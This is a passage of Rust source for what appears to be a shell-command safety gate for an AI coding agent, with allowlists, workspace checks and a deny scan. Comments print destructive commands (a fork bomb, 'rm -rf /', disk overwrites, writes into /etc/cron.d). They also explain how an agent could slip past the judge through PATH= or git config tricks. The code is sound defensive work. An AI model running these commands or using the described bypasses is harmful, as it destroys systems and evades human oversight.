    "cal",
    "whoami",
    "who",
    "id",
    "groups",
    "hostname",
    "uname",
    "arch",
    "uptime",
    "which",
    "type",
    "whereis",
    "getconf",
    "locale",
    "free",
    "vm_stat",
    "sw_vers",
    "ps",
    "pgrep",
    "uuidgen",
    "tput",
    "clear",
    "tty",
    // Trivial builtins / no-ops
    "true",
    "false",
    "sleep",
    "seq",
    "test",
    "[",
    "expr",
];

/// The subset of [`READ_ONLY_HEADS`] that can be pointed at an output FILE
/// rather than stdout. "Read-only" holds for the ordinary invocation, but not
/// for every argument list:
///
/// * `sort -o FILE`, `tree -o FILE`, macOS `base64 -o FILE`
/// * `uniq [INPUT [OUTPUT]]` and `xxd [INFILE [OUTFILE]]`, where the write is a
///   trailing POSITIONAL with no flag to spot
/// * `yq -i` / `--inplace`, which rewrites its input
/// * `less -o FILE`, which logs piped input to a named file
///
/// None of those forms carries a `>` for `redirect_targets` to catch, so
/// without this check `sort -o /etc/crontab data/f` settles `Safe`: no card on
/// the chat lane, and `RequestVerdict::Benign` (unattended auto-allow) on the
/// coding-agent lane. They stay on the allowlist because the common form really
/// is a read, but only while every path they name is inside the workspace.
///
/// The check is coarse on purpose, and it costs more than it once did. Telling
/// `sort -o /etc/x data/f` from `sort /etc/passwd` needs per-head flag arity,
/// which is exactly what listing the heads here avoids. So BOTH are a
/// [`FastPathDecline::Refusal`]: a judge call on the chat lane, and a DENIAL
/// on the unattended coding-agent lane, which fails closed on a refusal. To
/// read outside the workspace unattended, reach for `cat` / `head` / `grep`,
/// which are plain read-only heads and still settle Safe.
static WRITE_CAPABLE_READ_ONLY_HEADS: &[&str] =
    &["sort", "uniq", "tree", "xxd", "yq", "base64", "less"];

/// Command heads that create or extend in-workspace paths — safe when every
/// path argument stays inside the workspace.
static CREATE_HEADS: &[&str] = &["mkdir", "touch"];

/// Read-only `git` subcommands. Anything mutating (`push`, `commit`, `reset`,
/// `branch -D`, `config <k> <v>`, `tag <name>`, `remote add`, …) is absent and
/// falls through to the judge.
static GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "reflog",
    "rev-parse",
    "rev-list",
    "ls-files",
    "ls-tree",
    "cat-file",
    "show-ref",
    "describe",
    "shortlog",
    "whatchanged",
    "grep",
    "var",
    "count-objects",
    "fsck",
    "version",
];

/// Why the Safe fast path did not settle a command. The two are NOT
/// interchangeable, and two permissive paths separate them: the unattended
/// coding-agent lane denies a [`FastPathDecline::Refusal`] and still runs a
/// [`FastPathDecline::Omission`], and [`grant_covers_command`] refuses to let
/// a stored grant cover a Refusal.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FastPathDecline {
    /// The head is not what runs, or not all of it. The allowlist refuses
    /// these on purpose, and the full set is:
    ///
    ///   * command or process substitution,
    ///   * a code-injecting `VAR=value` preamble,
    ///   * a path-qualified command head,
    ///   * a redirect target outside the workspace,
    ///   * an out-of-workspace path under a head that can WRITE one
    ///     ([`WRITE_CAPABLE_READ_ONLY_HEADS`], `curl`, `wget`),
    ///   * a create head pointed outside the workspace,
    ///   * `git -c` / `--config-env` / `--exec-path`, or a git output flag.
    ///
    /// The write-capable entry is the coarse one: the check is a path outside
    /// the workspace ANYWHERE in the segment, so `sort /etc/passwd` is a
    /// refusal even though it only reads. Telling the read from the write
    /// needs per-head flag arity, which is what that list exists to avoid.
    Refusal,
    /// The head is simply not on the allowlist. The allowlist header says what
    /// this costs: a judge call, never safety.
    Omission,
}

/// Why the fast path declined `command`, or `None` when every segment is
/// obviously safe.
///
/// One not-safe segment poisons the whole line, since a chained `&&` or `|`
/// could smuggle a dangerous command after a safe one. A refusal anywhere
/// outranks an omission.
fn bash_fast_path(command: &str) -> Option<FastPathDecline> {
    let mut declined = None;
    for segment in command_segments(command) {
        match segment_safety(&segment) {
            Some(FastPathDecline::Refusal) => return Some(FastPathDecline::Refusal),
            Some(FastPathDecline::Omission) => declined = Some(FastPathDecline::Omission),
            None => {}
        }
    }
    declined
}

/// Why one shell command segment is not obviously safe, or `None` when it is.
fn segment_safety(segment: &str) -> Option<FastPathDecline> {
    use FastPathDecline::{Omission, Refusal};
    // An output redirect to a path outside the workspace is a write outside the
    // workspace, not safe even behind a read-only head (`grep x f > /etc/y`).
    // Harmless device sinks (`/dev/null`, std streams) are exempt.
    if redirect_targets(segment).any(|t| !path_in_workspace(t) && !is_harmless_redirect(t)) {
        return Some(Refusal);
    }
    // Command/process substitution executes an embedded command under whatever
    // head precedes it. Never settle it Safe; the judge sees the full text.
    if has_command_substitution(segment) {
        return Some(Refusal);
    }
    let toks: Vec<&str> = segment.split_whitespace().collect();
    let i = command_head_index(&toks);
    // A `VAR=value` preamble is skipped when resolving the head. But a handful
    // of variable NAMES make the process load and run attacker-chosen code
    // before the head's own `main`. That would settle as a read-only head and
    // execute arbitrary code with no card and no checkpoint. Route those to the
    // judge. The head walk is deliberately left alone, so the catastrophic scan
    // still resolves the real command.
    //
    // Scanned over the PREAMBLE only, not the whole segment: past the head the
    // same text is an argument, not an assignment the shell acts on, so
    // `grep NODE_OPTIONS= .env` is an ordinary read.
    if preamble_has_code_injecting_env(&toks, i) {
        return Some(Refusal);
    }
    let Some(head) = toks.get(i) else {
        // Only benign prefixes / redirects, so no command runs.
        return None;
    };
    // Resolve the head by NAME, never by basename. Resolving a path-qualified
    // head to its basename would settle the agent's OWN binary as the read-only
    // one it is named after. The agent could then write it with an ordinary
    // in-workspace write and run it with no card, no checkpoint and no judge
    // call. That is the write-then-run escalation `PATH=` is on
    // `CODE_INJECTING_ENV_NAMES` to close, reachable without the preamble. A
    // path-qualified head falls through to the judge instead. The DANGER scans
    // keep resolving by basename, because there it can only add a verdict.
    if head.contains('/') {
        return Some(Refusal);
    }
    let base = *head;
    let args = &toks[i + 1..];
    match base {
        "git" => git_subcommand_safety(args),
        // A GET/download is safe unless it writes its output to a path outside
        // the workspace (`curl -o /etc/cron.d/evil …`). A mutating method is an
        // ordinary side-effect shape the fallback tags, not an evasion.
        "curl" | "wget" if segment_escapes_workspace(segment) => Some(Refusal),
        "curl" | "wget" => is_mutating_http(args).then_some(Omission),
        // Read-only in the ordinary form, but able to write a named file: the
        // same shape as the curl/wget arm above, and it must be tried BEFORE
        // the plain read-only arm below. See [`WRITE_CAPABLE_READ_ONLY_HEADS`].
        _ if WRITE_CAPABLE_READ_ONLY_HEADS.contains(&base) => {
            segment_escapes_workspace(segment).then_some(Refusal)
        }
        _ if READ_ONLY_HEADS.contains(&base) => None,
        _ if CREATE_HEADS.contains(&base) => (!args
            .iter()
            .filter(|a| !a.starts_with('-'))
            .all(|a| path_in_workspace(a)))
        .then_some(Refusal),
        _ => Some(Omission),
    }
}

/// Why a `git` call is not obviously safe, or `None` when it is. `args` is the
/// tokens after `git`; leading global flags are skipped. Safe means a
/// read-only subcommand that is not pointed at an output file.
///
/// The output-flag half is not redundant. "Read-only" here means "does not
/// mutate the repository". The whole diff family accepts an output flag, which
/// truncates and rewrites an arbitrary path with no `>` for `redirect_targets`
/// to see. Such a call would settle `Safe`, with no card on the chat lane and
/// an unattended auto-allow on the coding-agent one.
fn git_subcommand_safety(args: &[&str]) -> Option<FastPathDecline> {
    let mut i = 0;
    while let Some(&arg) = args.get(i) {
        // Global flags that can inject an executable under a read-only
        // subcommand. Never statically safe; let the judge see them.
        //   `-c k=v` / `--config-env`: an executable config (pager, editor,
        //     sshCommand, alias).
        //   `--exec-path[=<dir>]`: redirects where git resolves `git-<sub>`.
        if arg == "-c"
            || arg == "--config-env"
            || arg.starts_with("--config-env=")
            || arg == "--exec-path"
            || arg.starts_with("--exec-path=")
        {
            return Some(FastPathDecline::Refusal);
        }
        match arg {
            // Flags that take a separate value argument.
            "-C" | "--git-dir" | "--work-tree" | "--namespace" => i += 2,
            a if a.starts_with('-') => i += 1,
            _ => break,
        }
    }
    if !args
        .get(i)
        .is_some_and(|sub| GIT_READ_ONLY_SUBCOMMANDS.contains(sub))
    {
        // A mutating or unknown subcommand (`push`, `commit`) is an omission,
        // the same shape as an unrecognised head. It hides nothing.
        return Some(FastPathDecline::Omission);
    }
    args[i + 1..]
        .iter()
        .any(|a| is_git_output_flag(a))
        .then_some(FastPathDecline::Refusal)
}

/// True when a post-subcommand `git` token names a file the subcommand will
/// write.
///
/// Long spellings ONLY, deliberately. A bare `-o` is NOT an output flag for
/// any subcommand on [`GIT_READ_ONLY_SUBCOMMANDS`]: the diff family accepts
/// only the long form, while `-o` means something else on `ls-files` and
/// `grep`. Matching it would cost a judge call on a routine read and buy no
/// safety, because git rejects `-o` on the subcommands that can write.
/// `--output-directory` is kept for the day `format-patch` joins the list.
fn is_git_output_flag(arg: &str) -> bool {
    matches!(arg, "--output" | "--output-directory")
        || arg.starts_with("--output=")
        || arg.starts_with("--output-directory=")
}

/// True when `code` is statically safe Python: no signal of a real-world
/// side-effect or arbitrary shell-out. Pure compute, data crunching and
/// in-workspace file work have no signal and run without the judge. A network
/// write, a subprocess or an eval shape falls through to it.
fn python_is_statically_safe(code: &str) -> bool {
    !python_side_effect_signal(code)
}

/// Heuristic signal that Python `code` may have a real-world side-effect or
/// run arbitrary shell. Broader than [`python_side_effect_category`], which is
/// the definite-write set the static fallback summarises. A match routes the
/// code to the judge, which reads the actual call to decide the lane.
fn python_side_effect_signal(code: &str) -> bool {
    const SIGNALS: &[&str] = &[
        // Network writes — generic `.post(`-style method shapes, so a renamed
        // client (`s = requests.Session(); s.post(…)`, an httpx client, an SDK
        // wrapper) is caught regardless of the variable name. A false positive
        // (e.g. `queue.put(`) only costs one judge call, never a wrong verdict.
        ".post(",
        ".put(",
        ".patch(",
        ".delete(",
        "urllib.request.urlopen(",
        "aiohttp",
        "pycurl",
        // Mail / remote-execution / cloud SDKs — side-effect-capable libraries
        // whose mere mention is a strong talk-to-the-world signal.
        "smtplib",
        "boto3",
        "google.cloud",
        "paramiko",
        "ftplib",
        "telnetlib",
        // Arbitrary shell-out / eval (incl. dynamic-import indirection)
        "subprocess",
        "os.system(",
        "os.popen(",
        "os.exec",
        "pty.spawn(",
        "eval(",
        "exec(",
        "__import__(",
    ];
    // Filesystem destruction also routes to the judge, which reads the path to
    // decide the lane. The static fallback derives the same split from string
    // literals. A plain write is a known residual: flagging every file write
    // would tax routine data output, and an out-of-workspace one is an
    // implausible screwup.
    SIGNALS.iter().any(|s| code.contains(s))
        || PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s))
}

// --- Out-of-workspace marker + path helpers --------------------------------

/// True when any segment of `command` touches a filesystem path or redirect
/// outside the workspace. A *risk signal* passed to the judge, NOT a verdict:
/// an out-of-workspace read is wanted, and only destruction is a threat.
pub fn command_escapes_workspace(command: &str) -> bool {
    command_segments(command).any(|s| segment_escapes_workspace(&s))
}

fn segment_escapes_workspace(segment: &str) -> bool {
    // Redirect targets (covers glued forms like `>/etc/y` the token scan misses)…
    if redirect_targets(segment).any(|t| !path_in_workspace(t) && !is_harmless_redirect(t)) {
        return true;
    }
    // …plus any token that names a path outside the workspace.
    segment.split_whitespace().any(token_escapes_workspace)
}

/// True when a single token names a path outside the workspace, in any of the
/// three shapes an argument can carry one: a bare path, the value of an
/// `=`-glued option, or the value of a SHORT-glued option.
///
/// The third shape needs no per-flag knowledge, because the answer only has to
/// be safe rather than exact. `is_pathish` rejects anything starting with `-`,
/// and there is no `=` to split on. An absolute path glued to its flag would
/// therefore ride past both other branches, and reach the Safe verdict its
/// spaced form is refused for. Over-flagging a flag that merely holds a slash
/// costs one judge call, the direction this allowlist fails in.
fn token_escapes_workspace(tok: &str) -> bool {
    if is_pathish(tok) && !path_in_workspace(tok) && !is_harmless_redirect(tok) {
        return true;
    }
    if let Some((_flag, value)) = tok.split_once('=') {
        if is_pathish(value) && !path_in_workspace(value) && !is_harmless_redirect(value) {
            return true;
        }
    }
    // Short-glued option value: drop the leading dashes and the single option
    // character, and judge what is left. Scanning for the first `/` instead
    // would turn an in-workspace relative path into an absolute one, which is
    // wrong in the direction that matters most. A multi-letter bundle simply
    // leaves a non-pathish remainder. `char_indices` keeps the slice on a
    // boundary.
    if let Some(rest) = tok.strip_prefix('-') {
        let rest = rest.strip_prefix('-').unwrap_or(rest);
        let mut chars = rest.char_indices();
        chars.next();
        if let Some((idx, _)) = chars.next() {
            let value = &rest[idx..];
            if is_pathish(value) && !path_in_workspace(value) && !is_harmless_redirect(value) {
                return true;
            }
        }
    }
    false
}

/// True when a token looks like a filesystem path, so its location is worth
/// checking: it contains a `/` without being a URL, or is `..`, or starts with
/// `~`. Flags are excluded.
fn is_pathish(token: &str) -> bool {
    let t = token.trim_matches(|c| c == '"' || c == '\'');
    if t.starts_with('-') {
        return false;
    }
    if t.starts_with('~') || t == ".." || t.starts_with("../") {
        return true;
    }
    t.contains('/') && !t.contains("://")
}

/// True when a path stays inside the workspace (the agent's cwd). Conservative:
/// absolute paths, home-relative paths, any `..` traversal, and any path with a
/// `$VAR` component (which can resolve anywhere) are treated as escaping. A
/// bare or `./`-relative literal path is in-workspace.
fn path_in_workspace(token: &str) -> bool {
    let t = token.trim_matches(|c| c == '"' || c == '\'');
    if t.starts_with('/') || t.starts_with('~') || t.contains('$') {
        return false;
    }
    !t.split('/').any(|seg| seg == "..")
}

/// True for redirect targets that don't write to a real file — the null sink
/// and the standard streams. (Raw block devices are caught by the catastrophic
/// scan, not here.)
fn is_harmless_redirect(target: &str) -> bool {
    let t = target.trim_matches(|c| c == '"' || c == '\'');
    matches!(t, "/dev/null" | "/dev/stdout" | "/dev/stderr" | "/dev/tty")
}

/// Output-redirect matcher (`>`, `>>`, `2>`, `&>`, …) capturing the target
/// path. fd-duplications (`2>&1`) yield no path (the `&` stops the capture).
/// Shared by [`redirect_targets`] (any redirect) and
/// [`truncating_redirect_escapes`] (which inspects the full match to exclude
/// appends).
static REDIRECT_RE: LazyLock<regex::Regex> =
    LazyLock::new(|| regex::Regex::new(r#"(?:\d*|&)>>?\s*['"]?([^\s'"|&;<>]+)"#).unwrap());

/// The path targets of output redirects in a segment.
fn redirect_targets(segment: &str) -> impl Iterator<Item = &str> {
    REDIRECT_RE
        .captures_iter(segment)
        .filter_map(|c| c.get(1).map(|m| m.as_str()))
}

/// If `command` matches a catastrophic pattern, return a short human-readable
/// reason (used both for the verdict and for the refusal message). `None` means
/// not catastrophic.
///
/// Deliberately narrow: only universally-destructive patterns no legitimate task
/// needs. Out-of-workspace deletion of a *specific* path (e.g. `rm -rf /etc`) is
/// NOT caught here — it belongs to the ask/judge lane in a later phase, not the
/// deterministic hard-block.
fn catastrophic_reason(command: &str) -> Option<&'static str> {
    catastrophic_reason_at(command, 0)
}

/// [`catastrophic_reason`], carrying the substitution-recursion depth.
fn catastrophic_reason_at(command: &str, depth: usize) -> Option<&'static str> {
    if is_fork_bomb(command) {
        return Some("a fork bomb (a recursive self-spawning process that exhausts the machine)");
    }
    if formats_or_overwrites_disk(command) {
        return Some(
            "a raw disk format or overwrite (mkfs, dd, or a redirect onto a block device)",
        );
    }
    for segment in command_segments(command) {
        // Unwrap a shell wrapper PER SEGMENT, not just at the head of the
        // whole line. `static_classify` unwraps the outermost wrapper only. It
        // does nothing for a wrapper in a LATER segment, where the head token
        // reads as `bash` and the payload is never inspected. Prefixing any
        // read-only command would then be enough to walk the hard-block.
        // Unwrapping here can only ADD a catastrophic verdict.
        let inner = unwrap_shell_command(&segment);
        if let Some(reason) = catastrophic_rm_or_chmod(&inner) {
            return Some(reason);
        }
    }
    // A substitution runs its body, and every scan above reads the OUTER head,
    // so `echo $(rm -rf /)` resolves to `echo`. Classify each body too.
    if depth < MAX_SUBSTITUTION_DEPTH {
        for body in substitution_bodies(command) {
            if let Some(reason) = catastrophic_reason_at(body, depth + 1) {
                return Some(reason);
            }
        }
    }
    None
}

/// Split a command line into individual command segments at shell control
/// operators, so a chained command is analysed segment by segment.
/// fd-duplications are stripped first. They are pure plumbing, and splitting
/// on their `&` would shear a redirect into a junk segment. That defeats the
/// safe fast path for one of the most common shell shapes.
fn command_segments(command: &str) -> impl Iterator<Item = String> {
    static FD_DUP: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"\d*>&\d+").unwrap());
    static SEP: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"&&|\|\||;|\||&|\n").unwrap());
    let cleaned = FD_DUP.replace_all(command, " ").into_owned();
    SEP.split(&cleaned)
        .map(str::to_string)
        .collect::<Vec<_>>()
        .into_iter()
}

/// Detect a fork bomb: a function whose body pipes itself into itself and
/// backgrounds the result — `:(){ :|:& };:` and named variants like
/// `bomb(){ bomb|bomb& };bomb`. The function name is extracted in code (the
/// `regex` crate has no backreferences) and the body checked for `name|name`
/// plus a `&`.
fn is_fork_bomb(command: &str) -> bool {
    static DEF: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"([A-Za-z_:][A-Za-z0-9_]*)\s*\(\s*\)\s*\{").unwrap());
    for caps in DEF.captures_iter(command) {
        let name = caps.get(1).map(|m| m.as_str()).unwrap_or("");
        if name.is_empty() {
            continue;
        }
        let body_start = caps.get(0).map(|m| m.end()).unwrap_or(0);
        // Best-effort body: from the opening brace to the next `}`.
        let body = command[body_start..].split('}').next().unwrap_or("");
        let compact: String = body.chars().filter(|c| !c.is_whitespace()).collect();
        let self_pipe = format!("{name}|{name}");
        if compact.contains(&self_pipe) && compact.contains('&') {
            return true;
        }
    }
    false
}

/// Detect formatting a filesystem or overwriting a raw block device:
/// `mkfs[.fs] /dev/<disk>`, `dd ... of=/dev/<disk>`, or `> /dev/<disk>`.
/// Harmless device targets (`/dev/null`, `/dev/stdout`, …) are excluded via
/// [`is_disk_device`].
fn formats_or_overwrites_disk(command: &str) -> bool {
    static MKFS: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"\bmkfs(\.[A-Za-z0-9]+)?\b").unwrap());
    static OF: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"\bof=(\S+)").unwrap());
    static REDIRECT_DEV: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r#">>?\s*['"]?(/dev/[^\s'"|&;]+)"#).unwrap());

    if MKFS.is_match(command) && mentions_disk_device(command) {
        return true;
    }
    if OF.captures_iter(command).any(|c| is_disk_device(&c[1])) {
        return true;
    }
    REDIRECT_DEV
        .captures_iter(command)
        .any(|c| is_disk_device(&c[1]))
}

/// True if any `/dev/<name>` path mentioned in `command` is a raw disk device.
fn mentions_disk_device(command: &str) -> bool {
    static DEV_PATH: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r"/dev/[A-Za-z0-9/_-]+").unwrap());
    DEV_PATH
        .find_iter(command)
        .any(|m| is_disk_device(m.as_str()))
}

/// True for a raw block device under `/dev/` (sd*, nvme*, disk*, …); false for
/// the harmless character devices (`/dev/null`, `/dev/stdout`, `/dev/zero`, …).
fn is_disk_device(raw: &str) -> bool {
    let path = raw.trim_matches(|c| c == '"' || c == '\'');
    let Some(dev) = path.strip_prefix("/dev/") else {
        return false;
    };
    const DISK_PREFIXES: &[&str] = &["sd", "hd", "vd", "xvd", "nvme", "mmcblk", "disk", "loop"];
    DISK_PREFIXES.iter().any(|pre| dev.starts_with(pre))
}

/// Detect a recursive `rm` or `chmod` whose target is the filesystem root or
/// home directory. Requires both a recursive flag AND a catastrophic target, so
/// `rm -rf data/tmp` or `chmod -R 755 data/` are untouched.
fn catastrophic_rm_or_chmod(segment: &str) -> Option<&'static str> {
    let toks: Vec<&str> = segment.split_whitespace().collect();
    danger_head_candidates(&toks)
        .into_iter()
        .find_map(|(base, args)| {
            let reason = match base.as_str() {
                "rm" => "recursive deletion of the filesystem root or home directory",
                "chmod" => "a recursive permission change on the filesystem root or home directory",
                _ => return None,
            };
            let recursive = args.iter().any(|a| is_recursive_flag(a));
            let targets_root = args.iter().any(|a| is_catastrophic_target(a));
            (recursive && targets_root).then_some(reason)
        })
}

/// The command word a head token really names, after stripping the shell
/// decorations that do NOT change which binary runs: a leading backslash (the
/// alias-bypass form), surrounding quotes, a glued grouping token, and any
/// directory prefix.
///
/// A raw basename comparison reads a decorated head as an unknown command. It
/// then matches neither the catastrophic deny-list nor the destruction-scope
/// scan, and classifies all the way through to Safe.
fn normalized_head(head: &str) -> &str {
    let stripped = head.trim_start_matches(['(', '{', '\\']);
    // `$'rm'` (ANSI-C) and `$"rm"` (locale) both run the plain `rm`. The `$`
    // blocks the quote trim below, so it comes off first. Only before a
    // quote, so `$HOME` keeps its sigil and stays an unknown word.
    let stripped = match stripped.strip_prefix('$') {
        Some(rest) if rest.starts_with('\'') || rest.starts_with('"') => rest,
        _ => stripped,
    };
    let unquoted = stripped.trim_matches(|c| c == '"' || c == '\'');
    unquoted.rsplit('/').next().unwrap_or(unquoted)
}

/// True for a token that reads as a command-line option rather than a command
/// word. A lone `-` is the conventional stdin/stdout placeholder, not a flag.
fn is_flag_token(tok: &str) -> bool {
    tok.starts_with('-') && tok.len() > 1
}

/// Every (command word, argument tokens) pair a segment could be running, for
/// the three scans that CLASSIFY DANGER. Extends [`command_head_index`] by also
/// walking past a bare shell grouping token, and normalizes each head via
/// [`normalized_head`].
///
/// It returns a LIST rather than one head, because a wrapper's own options have
/// an arity we cannot know. [`is_benign_prefix`] never matches a `-`-prefixed
/// token, so a naive walk stops dead on one and resolves the head to the FLAG.
/// The whole line then matches no danger table and settles `Safe`.
///
/// Enumerating each wrapper's flag arity is the other repair, and it fails OPEN
/// on every flag not listed. So a flag-shaped head branches into BOTH readings,
/// and every reading is scanned. That is safe by construction: these scans can
/// only ADD a danger verdict. A head that is not flag-shaped never branches, so
/// it costs nothing on ordinary input.
///
/// Deliberately NOT used by [`segment_safety`]. There an unrecognised head
/// already falls through to the judge, so resolving these forms would newly
/// SETTLE decorated commands as Safe.
fn danger_head_candidates<'a>(toks: &'a [&'a str]) -> Vec<(String, &'a [&'a str])> {
    // The grouping-token walk, from an arbitrary starting offset.
    fn resolve_head_at(toks: &[&str], from: usize) -> usize {
        let mut from = from;
        loop {
            let next = from + command_head_index(&toks[from..]);
            match toks.get(next) {
                Some(&"{") | Some(&"(") => from = next + 1,
                _ => return next,
            }
        }
    }
    let mut candidates = Vec::new();
    let mut seen = vec![false; toks.len()];
    let mut pending = vec![0usize];
    while let Some(start) = pending.pop() {
        if start > toks.len() {
            continue;
        }
        let at = resolve_head_at(toks, start);
        let Some(head) = toks.get(at) else { continue };
        if seen[at] {
            continue;
        }
        seen[at] = true;
        candidates.push((normalized_head(head).to_string(), &toks[at + 1..]));
        if is_flag_token(head) {
            // The walk stopped inside a wrapper's own options. Try both arities.
            pending.push(at + 1);
            pending.push(at + 2);
        }
    }
    candidates
}

/// Environment-variable names whose value is loaded and EXECUTED by the
/// process the command starts. A `VAR=value` preamble carrying one runs code
/// the command head says nothing about. Matched case-sensitively, because the
/// loader and these interpreters read exact upper-case names.
///
/// **An entry ending in `=` is an EXACT name; every other entry is a prefix.**
/// The three-letter names begin many ordinary application variables, and
/// matching those as prefixes drops routine commands out of the Safe fast path
/// for nothing.
///
/// Not a completeness claim: it covers the loader hooks (`LD_*`, `DYLD_*`) and
/// the startup-file hooks of the interpreters we ship or that any dev box has.
/// A miss costs a judge call that did not happen, so add rather than debate.
const CODE_INJECTING_ENV_NAMES: &[&str] = &[
    "LD_",
    "DYLD_",
    "BASH_ENV",
    "ENV=",
    // The most direct one. The agent can write its own binary with an ordinary
    // in-workspace write, itself Safe. A `PATH=` preamble then runs it with no
    // card, no checkpoint and no judge call. Exact, so `PATHEXT=` and the
    // various build variables keep the fast path.
    "PATH=",
    "SHELLOPTS",
    "BASHOPTS",
    "PS4",
    "IFS=",
    "PYTHONSTARTUP",
    "PYTHONPATH",
    "PERL5OPT",
    "PERL5LIB",
    "RUBYOPT",
    "NODE_OPTIONS",
    "GIT_SSH",
    "GIT_EXTERNAL_DIFF",
    "GIT_PAGER",
    "GIT_EDITOR",
    // Covers GIT_CONFIG_GLOBAL / _SYSTEM / _COUNT / _KEY_n / _VALUE_n. These are
    // the environment equivalents of `git -c` and `--config-env`, which
    // `git_subcommand_safety` already refuses by name as "an executable
    // config", and they reach the same place: a config file naming
    // `diff.external` makes a plain `git diff` run it. The same write-then-run
    // path as `PATH=` applies, since writing `data/g` is itself Safe.
    "GIT_CONFIG",
];

/// True when `tok` is a `VAR=value` assignment whose variable name is one of
/// [`CODE_INJECTING_ENV_NAMES`].
///
/// A trailing `=` in the list marks an **exact** variable name; every other
/// entry is a name prefix. The distinction is load-bearing. `ENV` and `IFS`
/// begin an enormous number of ordinary application variables. Matching them as
/// prefixes would drop routine commands out of the Safe fast path and send them
/// to the judge for nothing.
fn is_code_injecting_assignment(tok: &str) -> bool {
    let Some((name, _)) = tok.split_once('=') else {
        return false;
    };
    // bash's append form assigns the same variable, so the `+` has to come off
    // before an exact-name comparison. Without it, an appended `PATH` sails
    // past the fast path while the plain one is refused.
    let name = name.strip_suffix('+').unwrap_or(name);
    if name.is_empty() || name.starts_with('-') {
        return false;
    }
    CODE_INJECTING_ENV_NAMES
        .iter()
        .any(|p| match p.strip_suffix('=') {
            Some(exact) => name == exact,
            None => name.starts_with(p),
        })
}

/// True when the `VAR=value` preamble before the head at `head_at` carries a
/// code-injecting variable name.
fn preamble_has_code_injecting_env(toks: &[&str], head_at: usize) -> bool {
    toks.iter()
        .take(head_at)
        .copied()
        .any(is_code_injecting_assignment)
}

/// Command-line tokens that prefix the real command and should be skipped when
/// looking for the command head: privilege/wrapper words and `VAR=value`
/// environment assignments.
fn is_benign_prefix(tok: &str) -> bool {
    matches!(
        tok,
        "sudo" | "env" | "command" | "time" | "nice" | "builtin" | "exec" | "\\"
    ) || (!tok.starts_with('-') && tok.contains('='))
}

/// Walk past the tokens that precede the real command word and return the index
/// of the command head in `toks`. Returns `toks.len()` when the segment is only
/// prefixes and redirects, so no command runs. Two kinds of preamble are
/// skipped:
///   * benign privilege and wrapper prefixes, plus `VAR=value`,
///   * **leading I/O redirections**. Bash allows a redirect before the command,
///     which must not be mistaken for the command itself. Otherwise it slips
///     past both the safe-list and the catastrophic deny-list.
fn command_head_index(toks: &[&str]) -> usize {
    let mut i = 0;
    while let Some(tok) = toks.get(i) {
        if is_benign_prefix(tok) {
            i += 1;
        } else if let Some(needs_target) = redirect_token_needs_target(tok) {
            i += if needs_target { 2 } else { 1 };
        } else {
            break;
        }
    }
    i
}

/// If `tok` is an I/O-redirection operator, return whether its target is the
/// *following* token rather than glued onto this one. `None` when `tok` is not
/// a redirect.
fn redirect_token_needs_target(tok: &str) -> Option<bool> {
    let rest = tok.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
    let after = rest
        .strip_prefix(">>")
        .or_else(|| rest.strip_prefix('>'))
        .or_else(|| rest.strip_prefix('<'))?;
    Some(after.is_empty())
}

/// True when a segment contains command or process substitution, constructs
/// that execute an embedded command (`$(...)`, backticks, `<(...)`, `>(...)`).
/// Such a segment is never settled Safe regardless of its head (`echo $(rm -rf
/// /)` would otherwise pass on `echo`); the judge sees the full text instead.
fn has_command_substitution(segment: &str) -> bool {
    segment.contains("$(")
        || segment.contains('`')
        || segment.contains("<(")
        || segment.contains(">(")
}

/// How deep the danger scans follow nested substitutions. Two levels is
/// already exotic, so the cap only exists to bound a pathological string.
const MAX_SUBSTITUTION_DEPTH: usize = 8;

/// The body of every command or process substitution in `s`: `$(...)`,
/// backticks, `<(...)` and `>(...)`.
///
/// Each body is a command in its own right, and no head-token scan can see it:
/// `echo $(rm -rf /)` reads as head `echo`. So the danger scans classify each
/// body on its own merits, the way they already recurse into a `sh -c`
/// payload. [`has_command_substitution`] only keeps the Safe fast path off
/// such a segment. The static fallback still read the outer head and landed on
/// Safe.
///
/// An opener inside a SINGLE-quoted run is skipped, since POSIX makes it
/// literal there. That keeps `grep -rn '$(rm -rf /)' docs` out of the
/// catastrophic hard block, which has no override. Double quotes are NOT
/// skipped: `$(` and a backtick both expand inside them.
///
/// An opener with no closer yields the rest of the string. An unparseable
/// substitution is scanned rather than waved through.
fn substitution_bodies(s: &str) -> Vec<&str> {
    let b = s.as_bytes();
    let mut bodies = Vec::new();
    let mut quotes = QuoteState::default();
    let mut i = 0;
    while i < b.len() {
        if let Some(next) = quotes.step(s, i) {
            i = next;
            continue;
        }
        match b[i] {
            b'`' => {
                let start = i + 1;
                let end = s[start..].find('`').map_or(s.len(), |o| start + o);
                bodies.push(&s[start..end]);
                i = (end + 1).min(s.len());
            }
            b'$' | b'<' | b'>' if b.get(i + 1) == Some(&b'(') => {
                let start = i + 2;
                let end = matching_close_paren(s, start);
                bodies.push(&s[start..end]);
                i = (end + 1).min(s.len());
            }
            _ => i += char_len_at(s, i),
        }
    }
    bodies
}

/// Byte offset of the `)` closing a substitution whose body starts at `start`,
/// or `s.len()` when it is never closed.
///
/// Nesting-aware, so `$(echo $(rm -rf /))` yields the outer body whole. Also
/// QUOTE-aware, because a parenthesis inside quotes is ordinary text.
/// `echo "$(printf ')' ; rm -rf /)"` would otherwise end the body at the
/// quoted `)` and hand the scans `printf '` alone.
fn matching_close_paren(s: &str, start: usize) -> usize {
    let b = s.as_bytes();
    let mut depth = 1usize;
    let mut quotes = QuoteState::default();
    let mut i = start;
    while i < b.len() {
        if let Some(next) = quotes.step_all_quotes(s, i) {
            i = next;
            continue;
        }
        match b[i] {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
            }
            _ => {}
        }
        i += char_len_at(s, i);
    }
    s.len()
}

/// POSIX quoting state for a byte walk over a command. Three runs, because
/// they differ on the two questions the scanners ask:
///
/// | run | expands `$(` | backslash escapes |
/// |---|---|---|
